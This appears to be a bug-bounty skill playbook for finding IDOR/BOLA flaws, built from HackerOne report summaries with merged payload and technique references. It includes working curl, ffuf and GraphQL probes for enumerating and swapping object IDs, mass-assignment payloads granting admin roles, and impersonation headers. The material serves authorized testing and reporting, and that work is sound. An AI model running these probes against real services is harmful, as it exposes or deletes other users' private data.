> Hello Snapchat, Snapchat has viral video feature callled spotlight which alone was the biggest trend and increase snapchat users and profit in millions. I found a way to delete anyone's spotlight remotely. Please see the below poc:- 1. First go to https://my.snapchat.com/myposts and log in there. 2. You will see your posts . 3. Now turn burp suite and intercept. 4.Select any of your posts and click delete option. 5. Now capture the delete request.

### IDOR to add secondary users in www.paypal.com/businessmanage/users/api/v1/users

`#415081` · PayPal · $10,500 · high · 2019-07-30 · ▲797
> PayPal Business Accounts allow account owners to create multiple secondary users with specific privileges assigned to their employees. This submission identified a method that made it possible for a Business Account owner to assign secondary users from other accounts. The new secondary user would be granted access to the login allowing for unauthorized access to the functions of that single user login.

### How the Bug stole hacking

`#762510` · HackerOne · $0 · none · 2019-12-20 · ▲471
> In light of the season - here's a story I wrote for you: Impact Happy Holidays and thanks for all you do. <3

### IDOR - Delete all Licenses and certifications from users account using CreateOrUpdateHackerCertification GraphQL query

`#2122671` · HackerOne · $0 · high · 2023-08-29 · ▲395
> Summary: Hey team, While editing our Licenses and certifications if we change the ID number we can delete other users Licenses and certifications . it simply can be done by editing the ID number in our graphql query. If change the ID from 1 to X possible range then we can delete all the Licenses and certifications present between these. Steps To Reproduce 1. Log in to your own account in two browsers A and B with User A and User B 2.

### IDOR allows user to access report details via reference.json endpoint

`#3862641` · HackerOne · $15,000 · critical · 2026-10-01 · ▲372
> Summary: An information disclosure vulnerability on the /reports/{id}/reference.json endpoint allowed VDP accounts created via hackerone.com/vdp-sign-up to access certain private report details. While the endpoint returned HTTP 422 "You do not have the appropriate access," the error response contained additional report details in the context.subject field.

### Industry context (2025–2026)

- BOLA has ranked **#1 on the OWASP API Security Top 10 since 2019** and remains **API1:2023**; CWE classifies it as **CWE-639 (Authorization Bypass Through User-Controlled Key)**.
- HackerOne 2025 data: IDOR reports increased **18–29% year-over-year**; IDOR represents **36% of medical-tech bounties**, **31% of professional-services bounties**, and **financial-services IDOR is up 47% vs. 2023**.
- IDOR is widely described as the highest-frequency, second-highest-value bug class in modern bug bounty after RCE; roughly 40% of observed API attacks in production environments are BOLA.
- IDOR chains pay **$10K+** when chained (mass assignment, ATO, financial impact); standalone read-IDOR is Low–Medium.

---

### Highest-value asset types (by payout potential)

| Asset Type | Why It Pays |
|---|---|
| Financial documents / billing APIs | PII + financial data exposure (Shopify, Uber, PayPal) |
| Private repositories / source code | IP theft, critical data loss (GitHub) |
| User messages / DMs | Privacy violation at scale (Reddit) |
| Account-management endpoints | User addition, deletion, privilege escalation (PayPal, Mozilla) |
| Business/org administration | Cross-tenant escalation, employee PII (Uber) |
| Content moderation/admin actions | Operational sabotage (Reddit mod logs) |
| Signed-URL / attachment endpoints | Private media, exports, KYC documents |
| WebSocket / GraphQL / mobile APIs | Authz often missing at frame- or field-level |

### Programs that pay most

- Platforms with **multi-tenancy** (SaaS, B2B tools)
- **Fintech and payment processors**
- **Social platforms with private content**
- **Developer tools with org/repo isolation**

---

### Pre-report gate (read first)

Before any report, answer all three — and confirm the differential.

### 1. What can the attacker DO right now?

Be specific: *"Attacker with a valid account can send `GET /api/v1/invoices/{victim_invoice_id}` and receive the victim's full billing document including name, address, and payment amount — without any relationship to that account."*

### 2. What does the victim LOSE?

Map to CIA:
- **Confidentiality** — data exposed
- **Integrity** — data modified / content deleted
- **Availability** — data destroyed / account locked out

Vague answers ("the victim loses privacy") fail. *"Victim loses confidentiality of private financial records"* or *"Victim's content is deleted by a third party"* is the bar.

### 3. Can it be reproduced in 10 minutes from scratch?

- Two fresh accounts created ✓
- Exact HTTP request documented with victim's ID ✓
- 200 OK response showing victim's data (or confirmed state change) ✓
- No reliance on pre-existing state or timing ✓

If you can't demo it reproducibly, do not file the report.

### The 200-but-no-data trap (the #1 N/A driver)

An IDOR that returns **200 with an empty array, redacted fields, or `"access denied"` in the body** is not a finding — it's a broken status code. Always body-diff against a legitimate own-object response. If the fields you wanted are missing, the endpoint *is* authz'd, just with the wrong status. Similarly, an error response that leaks *some* victim data in a nested field (e.g. `context.subject`) **is** a finding — see HackerOne #3862641 (§7.1).

### Half-blind IDOR — don't classify as "no" too early

If the direct response is empty, check:
- error messages that echo victim object fragments
- async job/event objects (provisioning events, export status)
- rendered documents (PDFs, CSV exports, screenshots)
- GraphQL `errors` array — resolvers sometimes leak data in `extensions`
- secondary endpoints that consume the same ID (a "check status" endpoint may be less protected than the "get" endpoint)

---

### 1.1 URL patterns that scream IDOR

```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/graphql (query params with IDs)
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
/api/v1/users/{id}/orders/{order_id}/items/{item_id} (nested REST)
/api?file=42 (legacy query)
?invoiceId= (query-param object ref)
```

### 1.2 Identifier types — each has a different testing approach

| Identifier type | How to attack it |
|---|---|
| **Sequential integer** | decrement / increment ±1, ±100; `id=0`, `id=-1`, `id=null` |
| **UUID v4** | random — harvest another UUID from signup, invite, share, public listing, JS bundle, notification email, webhook payload |
| **UUID v1** | time-based — derivable if you know approximate creation time and node ID; libraries exist |
| **base64-encoded JSON** (`eyJp...`) | decode, swap ID, re-encode; check whether padding/format is validated |
| **Hashids / shortlinks** | try the salt (often leaked in JS bundle or defaults); brute-force with common salts |
| **Encrypted IDs** | try IV reuse / padding oracle (rare but devastating); look for AES-CBC patterns and fixed IVs |
| **Slug** | often derivable from username/title; try victim's known slug |
| **Composite keys** | `org:1:user:2` — swap one component at a time |
| **GID / Relay global ID** | `gid://app/Model/123` or `base64("Type:123")` — decode, increment, re-encode |

### 2.1 Basic numeric / UUID / encoded swaps

```
id=1 -> id=2, id=0, id=-1, id=999999
UUID swap: use a known UUID from another account
base64 decode/encode the ID
hex encode the ID
JWT sub claim as the ID source
gid://app/Model/123 -> increment the numeric tail
```

### 2.2 Batch / array

```
{"ids":[1,2,3]}          or repeated  id=1&id=2
id[]=victim              array-style
```

### 2.3 Nested / composite

```
/users/1/orders/2        user 1 but order 2
/invoice/9/line/1
```

### 2.4 IDOR via HTTP method tampering

```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -X $method \
    -H "Authorization: Bearer USER_B_TOKEN" \
    https://target.com/api/v1/users/USER_A_ID/profile
done
```

### 2.5 Verb-override headers

```
X-HTTP-Method-Override: GET
X-Method-Override: PUT
X-HTTP-Method: DELETE
_method=DELETE            (body)
```

### 2.6 GraphQL probes

```bash
# Introspection
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name,fields{name}}}}"}'

# Direct object IDOR
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'

# node() global-ID IDOR — often exposes every type even when named queries are locked down
-d '{"query":"{ node(id:\"VXNlcjp2aWN0aW1VVUlE\") { ... on User { email phone } } }"}'
```

### 2.7 JavaScript scraping for leaked IDs

```bash
# Find IDs in JS bundles
curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u

# Find object references in API responses
curl -s -H "Cookie: session=USER_A" \
  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"
```

### 2.8 Sequential enumeration with ffuf

```bash
ffuf -u "https://target.com/api/v1/orders/FUZZ" \
  -w ids.txt \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -mc 200 \
  -o idor_results.json

# ids.txt generated around a known value
python3 - <<'PY'
known_id = 48291
with open("ids.txt", "w") as f:
    for i in range(known_id - 500, known_id + 500):
        f.write(str(i) + "\n")
PY
```

### 2.11 Parameters observed

`id` · `type` · `action` · `message` · `userId` · `Password` · `aura.context` · `aura.pageURI` · `aura.token` · `file` · `domain` · `PID` · `RNo` · `time_range` · `accounts` · `passChange` · `__RequestVerificationToken` · `ConfirmPassword` · `export_columns` · `start`

---

### 3.1 Path / parameter tricks

```
/api/users/123      ->  /api/users/123/
                    ->  /api/users/123/.json
                    ->  /api/users/123;
                    ->  /api/Users/123                 (case)
                    ->  /api/users/12%33               (URL-encode a digit)
                    ->  /api//users/123                (double slash)
? id=victim&id=mine      (parameter pollution; try both orders)
? id[]=victim             (array)
? id=*                    (wildcard)
? id=%                    (wildcard)
? id=-1, id=null, id=0    (negative / null / zero)
```

### 3.2 HTTP method gaps

An endpoint may forbid GET but allow POST, PUT, PATCH, DELETE, HEAD, or OPTIONS. HEAD is especially useful — it can return headers (and sometimes content-length) without triggering body-level authz.

```
GET  /api/users/123  -> 403
POST /api/users/123  -> 200
PUT  /api/users/123  -> 200
HEAD /api/users/123  -> 200  (headers, sometimes content-length oracle)
```

### 3.3 Verb override

```
X-HTTP-Method-Override: GET
X-Method-Override: PUT
X-HTTP-Method: DELETE
_method=DELETE            (in body)
```

### 3.4 Shadow / legacy API endpoints

The web UI calls `/api/v1/users/{id}` (authz enforced), but legacy `/internal/users/{id}`, `/v0/users/{id}`, or `/legacy/` siblings may skip authz entirely. Mine JS bundles and Wayback Machine for old paths; authorization logic is often version-specific, so test `/v1/` and `/v2/` separately even when one appears fixed.

### 3.5 JWT user_id claim trust

The JWT contains `user_id`; the app also accepts a `user_id` in body/query, and the server uses the query value. Swap the query value → IDOR without touching the token. Also test whether the server honours `sub` / `uid` / `accountId` claims over session identity.

### 3.6 GraphQL specifics

- **Field-level IDOR** — the resolver auths the parent object but not nested relations; `node(id:)` often exposes every type even when named queries are locked down.
- **Alias-based abuse** — send many aliases in one request to brute-force IDs or bypass per-alias rate limits.
- **Batched queries** — GraphQL batching can amplify enumeration and evade per-request rate limits.
- **parseRefs / directive abuse** — Craft CMS CVE-2026-28696: the `@parseRefs` directive could be abused by authenticated users and unauthenticated guests (with a Public Schema) to read sensitive attributes of any element.
- **Mutation injection** — field-level authz missing on mutations (`updateUser`, `deleteOrg`, `transferBilling`).

### 3.7 WebSocket frame IDOR

WebSocket auth often happens only at handshake; subsequent frames are trusted. Sniff frames, modify `id` fields, and observe whether the server re-checks ownership per message.

### 3.8 Signed / pre-signed URL IDOR

A very common 2025–2026 pattern: the signing step is authz'd, but the ID fed into the signing step is not. The result is a signed URL for the victim's object.

- **paopao-ce** ≤0.6.0-alpha.3 — `DownloadAttachment` enumerated sequential `post_content` IDs and returned signed download URLs for other users' private / friend-only / follower-only images and videos (CVE-2026-111649, CVSS 7.1).
- **Decidim** — `DownloadYourDataController#download_file` confirmed export ownership, then redirected to a Rails Active Storage signed URL not bound to the session — anyone with the GET link could download the export.
- **Generic pattern** — get a pre-signed URL the normal way, capture both the signing request and the signed URL, then replay the signing request with a victim object ID. An IDOR with a cloud signature on top.

### 3.9 Bulk / batch / export endpoints

List, search, export, and batch endpoints often apply weaker authz than detail endpoints. Test:

- `POST /api/export {"ids":[...]}`
- `POST /api/batch`
- `?sort=id`, `?filter[user_id]=`
- CSV/PDF export generators

### 3.11 Mass assignment (BOPLA) — the under-tested cousin

App accepts JSON and copies fields straight to the model:

```js
user.update(req.body)          // node
User.update(params)            // rails, strong_parameters not used
Object.assign(entity, body)    // generic
```

Inject extra fields:

```json
{ "name":"foo", "email":"foo@x.com", "is_admin":true, "role":"admin", "permissions":["*"], "workspaceId":"VICTIM_WS" }
```

- **IXP Manager** — authenticated `AUTH_CUSTUSER` could overwrite another user's API key (including superuser) by addressing `api_keys.id` directly, then authenticate as that user.
- **FlowiseAI** — mass assignment on `workspaceId` and `id` in Evaluator / Assistant / DatasetRow / CustomTemplate controllers → cross-workspace data takeover and IDOR.
- **Chain primitive** — set `user_id` / `owner_id` to a victim to combine with IDOR, or flip `verified` to skip email/2FA gates.

### 3.12 Soft-delete / temporal IDOR

The "remove member" endpoint flips an `active=false` flag but does not invalidate the session / PAT. Capture the token before removal, have the admin remove the user, then re-issue API calls — the cached auth context still passes even though the policy table says the user no longer has permission. Weeks of post-termination cross-tenant access; GDPR/CCPA exposure (see Chain 5).

### 3.13 State-machine / race IDOR

Authorization checked at creation time, not at access time. Invites/tokens remain valid after the granting permission is revoked. Test:

- expired invites that can still be accepted
- race conditions on resource IDs (two simultaneous requests)
- state transitions that skip re-authz

### 3.14 OpenAPI spec-driven testing

If the target publishes an OpenAPI/Swagger spec, parse it and enumerate every GET that takes an object ID, then probe each with altered IDs and stripped auth. This is spec-driven, two-user, GET-only — fast and high-coverage.

### Part 4 — GraphQL IDOR (deep dive)

GraphQL is "one endpoint, infinite attack surface" — the IDOR factory.

### 4.1 Detection

```bash
for path in /graphql /graphiql /api/graphql /v1/graphql /v2/graphql /query /api/query /__graphql /altair; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [[ "$code" != "404" ]] && echo "[$code] $path"
done
```

### 4.2 Fingerprint the engine

`graphw00f` identifies Apollo / Hasura / Graphene / Yoga / AppSync / Sangria — each has different IDOR-prone defaults (e.g. Apollo introspection on in dev, Hasura direct DB access).

### 4.3 Introspection → enumerate every ID argument

If introspection is on, pull the schema, then for every query and mutation taking an `id` argument, substitute another user's ID. Test both queries (read) and mutations (write/delete).

### 4.4 Field-level IDOR

The top-level `node(id:)` resolver auths the requester, but nested relations do not re-check ownership against the resolved object:

```graphql
{ node(id:"<victim_gid>") {
    ... on Customer {
      email
      orders { totalPrice
        paymentMethods { cardLast4 } } } } }
```

Iterate IDs (decode base64 to numeric, increment) to exfil emails, order totals, payment methods across the entire customer base.

### 4.5 Aliases + batching

- Use aliases to send dozens of ID probes in one request.
- GraphQL batching can bypass per-request rate limits and amplify enumeration.
- CREATE→DELETE→READ synthesis is a known UAF / authz-testing pattern.

### 4.6 Directive abuse

Craft CMS `@parseRefs` (CVE-2026-28696) is the canonical 2026 example: the directive intended to parse internal reference tags could be abused by authenticated users and unauthenticated guests with a Public Schema to read sensitive attributes of any element. Test any directive that resolves references or fetches by ID.

### 7.1 One concrete lesson per report (450-report corpus, newest and most-upvoted first)

Read 5–10 before testing.

- Delete anyone's content spotlight remotely — #1819832 · Snapchat · $15,000 · ▲801 — `DeleteStorySnaps` GraphQL mutation accepted arbitrary `ids` for a `storyType`.
- IDOR allows user to access report details via reference.json endpoint — #3862641 · HackerOne · $15,000 · ▲372 — `POST {}` to `/reports/{id}/reference.json` returned an access-denied error that still leaked report details in `context.subject`.
- Insecure Direct Object Reference (IDOR) - Delete Campaigns — #1969141 · HackerOne · $0 · ▲346 — swap the campaign id parameter for another program's ongoing campaign id.
- Attachment disclosure via summary report — #2442008 · HackerOne · $0 · ▲340.
- Arbitrary Read of Another Users private repository without Authorization — #3124517 · GitHub · $10,000 · ▲276 — CVE-2025-8447.
- Deleting all DMs on RedditGifts.com — #1213237 · Reddit · $5,000 · ▲267 — change cookies/CSRF token and the message ID to your own.
- IDOR Allows Viewing Private Report Details via /bugs.json Endpoint — #2487889 · HackerOne · $0 · ▲266 — leaked title, url, id, state, substate, severity, timestamps, reporter name.
- Singapore - Account Takeover via IDOR — #876300 · Starbucks · $0 · ▲260 — alternate site shared database and cookie credentials with another regional property.
- Steal private objects of other projects via project import — #743953 · GitLab · $20,000 · ▲254 — foreign keys (issue ids, merge request ids) weren't excluded during import.
- IDOR: Account Deletion via Session Misbinding — #3154983 · Mozilla · $0 · ▲244 — `POST /v1/account/destroy` with attacker's session but the victim's email and authPW deleted the victim's account.
- Insecure redirect rule results in bypassing ban redirect — #703058 · Roblox · $0 · ▲233 — append `/membership/` after `.aspx`/`.ashx` extensions.
- IDOR enumeration disclosing email and phone number within cashier — #1966006 · Unikrn · $0 · ▲232.
- IDOR delete any Tickets on ads.tiktok.com — #1475520 · TikTok · $0 · ▲216 — via the "draft order id" parameter.
- IDOR allowing unauthorized use of another user's saved credit card at checkout — #391092 · Yelp · $0 · ▲214.
- IDOR vulnerability in unreleased HackerOne Copilot feature — #2218334 · HackerOne · $0 · ▲210 — captured `data.newConversation.llm_conversation.id` from Proxy History.
- IDOR allows an attacker to modify the links of any user — #1661113 · Reddit · $0 · ▲208 — swap the saved `id` in the request body.
- IDOR when editing users leads to Account Takeover without User Interaction — #915114 · Automattic · $0 · ▲202 — `GET /users/invite-user.php?id=(userid)&popup=1`.
- IDOR on GraphQL queries BillingDocumentDownload and BillDetails — #2207248 · Shopify · $5,000 · ▲187 — leaked other merchants' billing data via the invoice id.
- IDOR Vulnerability at AddTagToAssets operation name — #2633771 · HackerOne · $0 · ▲178 — `tagId` parameter carried base64 ciphertext.
- IDOR leads to Edit Anyone's Blogs / Websites — #974222 · Automattic · $0 · ▲177 — swap the `hidBlogID` parameter.
- Unauthorized Access to TikTok Account [Private Videos] via API Endpoint — #2868084 · TikTok · $0 · ▲167.
- Getting access of mod logs from any public or restricted subreddit — #1658418 · Reddit · $5,000 · ▲163 — pagination cursor manipulation.
- Unreleased CTF Levels revealed via `/group/user/ID1?user=USERID` — #536853 · HackerOne · $0 · ▲161.
- Email change / personal data change leading to ATO — #1250037 · Stripe · $3,000 · ▲149 — IndieHackers email-change flow.
- Disclose Hidden Comments on Media Section — #2541962 · pixiv · $500 · ▲149 — intercept any POST to `hub.vroid.com` and replay.
- Importing GitLab project archives can replace uploads of other users — #534794 · GitLab · $0 · ▲148.
- IDOR vulnerability (Price manipulation) — #1403176 · Acronis · $0 · ▲146 — manipulate the product ID post-purchase to change price.
- Applicant security exam attachments accessible via IDOR/BAC on a custom Apex controller — #2950536 · U.S. Dept Of Defense · $0 · ▲142.
- Missing ownership check on remote wipe endpoint — #819807 · Nextcloud · $500 · ▲141 — swap `data-id` to the victim's device ID.
- IDOR and statistics leakage in Orders — #544329 · X/xAI · $289 · ▲141.

### 7.4 Verified 2025–2026 advisories / CVEs

| Reference | Root-cause lesson |
|---|---|
| CVE-2026-28696 — Craft CMS `@parseRefs` GraphQL directive | Directive intended to parse internal references could be abused by authenticated users and unauthenticated guests (Public Schema) to read sensitive attributes of any element |
| CVE-2026-111649 — Rocboss paopao-ce `DownloadAttachment` | Sequential `post_content` IDs enumerated via `/v1/attachment` → signed download URLs for other users' private media (CVSS 7.1) |
| CVE-2026-79957 — ServiceNext `/api/Usuario/GetUsuarios` | User-controlled numeric ID; harvested credentials reused in credential-stuffing / lateral movement |
| CVE-2026-133173 — WatchAlert `/api/w8t/datasource/dataSourceGet` | Lookups omit `tenant_id` filtering → authenticated users read other tenants' datasources |
| CVE-2026-81031 — IDURAR ERP CRM password update | Changes the password of whichever account the request names rather than the requesting account |
| CVE-2026-77369 — Yjs WebSocket route | Session required but resource selected by `typename.referenceId.columnName` room name is not authorized; bidirectional sync reads/writes the selected column without CanRead/CanUpdate checks |
| Open WebUI `/api/v1/notes/{note_id}` | Authenticated users retrieve other users' notes by guessing/enumerating UUIDs |
| FlowiseAI Evaluator / Assistant / DatasetRow / CustomTemplate | `Object.assign(entity, body)` → client-controlled `workspaceId` and `id` → cross-workspace data takeover and IDOR |
| IXP Manager API-key update | IDOR/BOLA + mass assignment: low-privileged user overwrites superuser's API key by addressing `api_keys.id`, then authenticates as that user |
| Decidim `DownloadYourDataController` | Ownership checked, then redirected to a Rails Active Storage signed URL not bound to the session — link bearer can download the export |

Research hygiene: reopen the vendor advisory before citing affected/fixed versions in a live report — CNA, NVD, and vendor notes can disagree.

---

### 10.3 Debug / impersonation headers left enabled

Staging or admin-support tooling sometimes ships an "act as user" header that survives into production builds:

```
X-Impersonate-User: <victim_id>
X-Act-As: <victim_id>
X-Debug-User-Id: <victim_id>
X-On-Behalf-Of: <victim_id>
```

Worth a quick sweep on any endpoint that has an internal "support view" equivalent in the product (common in helpdesk/CRM-style SaaS).

### 10.4 Cache-key IDOR (shared cache serves victim's authenticated response to attacker)

If a CDN/edge cache's cache key doesn't include the `Authorization` header or session cookie (only the URL), a per-user response can get cached and served to a different authenticated user hitting the same URL. Request a personalized endpoint (`/api/me`, `/api/account/{id}`) as User A, then immediately replay the identical URL as User B and diff the response against B's own expected data — a hit of A's data via the cache is a cache-based IDOR, reportable alongside standard cache-poisoning methodology.

### 10.5 Pagination / cursor tampering

Opaque pagination cursors are frequently just base64 of a small JSON blob (`{"owner_id":123,"offset":40}`) or a signed-looking token that isn't actually verified server-side. Decode the cursor, swap the owner/tenant field, re-encode, and see whether the next page returns another user's records.

### 10.6 Secondary/public identifier aliasing

A resource often has two identifiers: the protected internal ID and a "public" one (share token, slug, short link) meant only for the owner to distribute — but if the public one resolves through an endpoint with weaker or no authz (e.g. a public-facing "view shared item" route), you can reach the same object without ever touching the protected ID. Map both identifier types for every object and test the weaker route.

### 10.7 Predictable storage-key IDOR in multi-tenant file storage

Multi-tenant apps that key S3/GCS objects by sequential or user-predictable paths (`uploads/{tenant_id}/{filename}`, `exports/{incrementing_id}.csv`) let you guess sibling objects directly against the storage provider if bucket/object ACLs don't independently enforce per-tenant isolation — don't stop testing at the app's API; test the storage URLs the API returns, too.

### 10.8 Async job / webhook replay IDOR

Background workers (report generation, export jobs, webhook delivery) sometimes run with elevated/service-level credentials and re-fetch an object by ID from the job payload without re-checking the requester's ownership at execution time (only at enqueue time, if at all). If you can influence a job's input ID (e.g. by resubmitting a captured webhook or export request with a different ID), the job may still execute with its elevated identity — classic "time of check, time of use" IDOR at the queue boundary, distinct from the state-machine race in §3.13.

### 10.9 Tenant-resolution case/locale confusion

When the tenant is resolved from a subdomain or header string (`tenant1.app.com`, `X-Tenant: tenant1`) and that string is used case-sensitively in one layer (routing) but case-insensitively in another (DB lookup), mismatched casing or Unicode-confusable characters can resolve to an unexpected tenant record. Worth a quick differential test on any subdomain- or header-based multi-tenant router.

---

### Part 11 — How to use this during an engagement

1. Confirm the differential is real. Two accounts, same request, different session, victim object ID. If you can't produce a body diff or a state-change confirmation, you don't have an IDOR — you have a status code.
2. Classify the identifier (§1.2) and pick the matching attack: ±1 for sequential, harvest for UUIDv4, derive for UUIDv1, decode for base64/Hashids, swap one component for composite.
3. Work through Part 3 bypasses when basic swapping returns 403 — path/param tricks, method gaps, verb override, shadow API, JWT claim trust, WebSocket frames, signed-URL step.
4. If GraphQL is present, run Part 4 — introspection → every id argument → `node(id:)` → field-level IDOR → aliases/batching → directive/persisted-query abuse.
5. Check BOPLA / mass assignment (§3.11) on every write endpoint — `workspaceId`, `role`, `is_admin`, `owner_id`, `verified`.
6. Sweep Part 10's additional tradecraft — content-negotiation, rewrite headers, impersonation headers, cache keys, cursors, secondary identifiers, storage keys, async jobs, tenant-resolution confusion — especially once the obvious vectors are blocked.
7. Look for the chain (Part 6). A read-IDOR alone is Low–Medium; the same bug plus an email-change, membership-add, refund, or soft-delete persistence is High–Critical.
8. Grade the impact honestly — confidentiality vs. integrity vs. availability; cross-tenant vs. same-tenant; one victim vs. mass extraction.
9. Meet the pre-report gate (top of document) and the reporting bar below before submitting.

---

## Companion methodology (merged, deduplicated)

Full text of every non-SKILL.md methodology file from the contributing skills — payload banks, technique references, reconnaissance and attack-class guides.

### Companion: hunting / references/payloads.md

# IDOR — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Numeric -> id=1 -> id=2, id=0, id=-1, id=999999

- UUID/hash -> swap a known UUID from another account; try UUIDv1 timestamps.

- Encoded -> base64 decode/encode, hex, JWT sub, gid://app/Model/123

- Batch -> `{"ids":[1,2,3]}` or repeated `id=1&id=2`

- Nested -> `/users/1/orders/2` with user 1 but order 2



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 4× | `MembershipRequest::getMembership()` |

| 4× | `link()` |

| 3× | `victim@email.com` |

| 3× | `MembershipService::getMembership()` |

| 2× | `Move to > My Content` |

| 2× | `application%5Bid%5D` |

| 2× | `curl --request POST \ / --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&extern` |

| 2× | `/BugReport/Admin/Attachment/{id}` |

| 2× | `attacker@email.com` |

| 2× | `{attacker-email}` |

| 2× | `curl -X GET "http://localhost:8080/ocs/v2.php/apps/circles/link/r2gmJl8n5xKWecQaVYe1dP3h6nqIUDk/ovYvboLMBNGvRXSkqhgllIKo6T7fvZl" \ / -H "OCS` |

| 2× | `getMembership()` |

| 2× | `LocalController::link()` |

| 1× | `POST /reports/[TEST_REPORT_ID]/reference.json HTTP/2 / Host: hackerone.com / Cookie: [your session cookie] / Content-Type: application/json` |

| 1× | `/reports/{id}/reference.json` |

| 1× | `/reports/{report_id}/reference.json` |

| 1× | `https://app.crowdsignal.com/users/invite-user.php?id=(userid)&popup=1` |

| 1× | `<PUT_VICTIM_EMAIL_HERE>` |

| 1× | `exmaple: GET /api/v1/users/@hasn0xxxx` |

| 1× | `GET /attachments/938540538 HTTP/1.1 / X-Signal-Agent: OWA / Accept-Encoding: gzip, deflate / X-Client-Version: BCM Android/5.1 Model/generic` |



## Parameters observed



`id` · `type` · `action` · `message` · `userId` · `Password` · `aura.context` · `aura.pageURI` · `aura.token` · `file` · `domain` · `PID` · `RNo` · `time_range` · `accounts` · `passChange` · `__RequestVerificationToken` · `ConfirmPassword` · `export_columns` · `start`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_idor.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_idor.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_idor.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_idor.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



Nuclei only finds exposed objects; the real work is cross-account replay with two identities.



```sh

nuclei -u https://target -tags idor,exposure \

       -severity low,medium,high,critical -rl 40 -o nuclei_idor.txt

nuclei -u https://target -t ~/nuclei-templates/http/exposures \

       -rl 40 -o nuclei_idor_exposures.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**Basic IDOR test with curl (swap cookie/token):**

```bash

# Get User A's resource ID while authenticated as A

curl -s -H "Cookie: session=USER_A_SESSION" \

  https://target.com/api/v1/invoices/12345



# Replay with User B's session

curl -s -H "Cookie: session=USER_B_SESSION" \

  https://target.com/api/v1/invoices/12345



# Success = 200 OK with User A's data

```



**GraphQL IDOR test:**

```bash

curl -s -X POST https://target.com/graphql \

  -H "Authorization: Bearer USER_B_TOKEN" \

  -H "Content-Type: application/json" \

  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'

```



**Enumerate sequential IDs with ffuf:**

```bash

ffuf -u "https://target.com/api/v1/orders/FUZZ" \

  -w ids.txt \

  -H "Authorization: Bearer USER_B_TOKEN" \

  -mc 200 \

  -o idor_results.json

```



**Generate sequential ID wordlist:**

```python

# Generate IDs around a known value

known_id = 48291

with open("ids.txt", "w") as f:

    for i in range(known_id - 500, known_id + 500):

        f.write(str(i) + "\n")

```



**Burp Intruder payload for IDOR scanning:**

```

GET /api/messages/§12345§ HTTP/1.1

Host: target.com

Authorization: Bearer USER_B_TOKEN



# Mark §12345§ as injection point

# Use numeric sequential payload: 12000-13000

# Filter responses by length difference or status 200

```



**JavaScript scraping for leaked IDs:**

```bash

# Find IDs in JS bundles

curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u



# Find object references in API responses

curl -s -H "Cookie: session=USER_A" \

  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"

```



**Grep patterns for source code review:**

```bash

# Missing authorization checks in common frameworks

grep -r "findById\|findOne\|getById" --include="*.js" .

grep -r "params\[:id\]\|params\['id'\]" --include="*.rb" .

grep -r "request\.args\.get\('id'\)" --include="*.py" .



# Look for direct ORM queries without user scoping

grep -r "Model\.find(params" --include="*.js" .

# vs secure pattern: Model.find({ id: params.id, userId: req.user.id })

```



**IDOR via HTTP method tampering:**

```bash

# Try undocumented methods

for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do

  echo "=== $method ==="

  curl -s -X $method \

    -H "Authorization: Bearer USER_B_TOKEN" \

    https://target.com/api/v1/users/USER_A_ID/profile

done

```



---

### Companion: hunting / references/techniques.md

# IDOR — Combined Field Guide — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Quick wins



Start here. These are the highest-yield tests for this class.



- Collect every identifier from responses, exports, emails, JS bundles, and mobile APIs.

- Replay the same request with a second account and with no auth; compare status, length, and body.

- Test list/search/export/batch endpoints, not only detail pages.

- Try nested resources: /org/1/user/2, /invoice/9/line/1, and composite IDs.

- Check file downloads and signed-URL generation for object substitution.



## Bypass tricks



- Swap GET/POST/PUT/PATCH/DELETE; try method override headers and `_method`.

- Move the ID from body to query, path, or header; try JSON arrays and duplicate keys.

- Test hidden fields and mass assignment on owner/org/role/account fields.

- GraphQL: query other users' nodes, aliases, and nested connections directly.



## Deeper checklist



- Collect every object identifier from responses, exports, emails, and JS bundles.

- Swap IDs across two accounts and across tenants; test sequential, UUID, and hashed IDs.

- Try ID formats: numeric +-1, UUID v1, base64, slug, composite keys, nested IDs.

- Check list, search, export, and batch endpoints, not just detail endpoints.

- Test file/download endpoints and signed URL generation for object substitution.

- Look for authorization based only on the parent object (nested resource IDOR).

- Confirm cross-account data access with a second controlled account.



